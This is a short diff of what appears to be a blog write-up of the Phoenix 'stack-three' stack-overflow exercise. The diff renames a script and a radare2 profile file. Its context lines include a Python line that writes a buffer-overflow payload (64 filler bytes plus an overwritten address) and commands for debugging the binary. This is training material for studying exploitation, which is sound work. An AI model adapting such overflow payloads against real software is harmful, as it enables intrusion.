@@ -214,7 +214,7 @@ os.write(1, b'\x58'*64 + b'\x35\x85\x04\x08')
 {% endhighlight %}
 
 {% highlight shell %}
-$ ./myScript.py > pattern
+$ ./theScript.py > pattern
 {% endhighlight %}
 
 {% highlight shell %}
@@ -226,7 +226,7 @@ stdin=./pattern
 *Replace `/dev/pts/0` with the output of the command `tty` and `./pattern` with the full path to the file that contains the input to be read from the binary.*
 
 {% highlight shell %}
-$ r2 -d /opt/phoenix/i486/stack-three -r myProfile.rr2
+$ r2 -d /opt/phoenix/i486/stack-three -r theProfile.rr2
 {% endhighlight %}
 
 {% highlight nasm %}
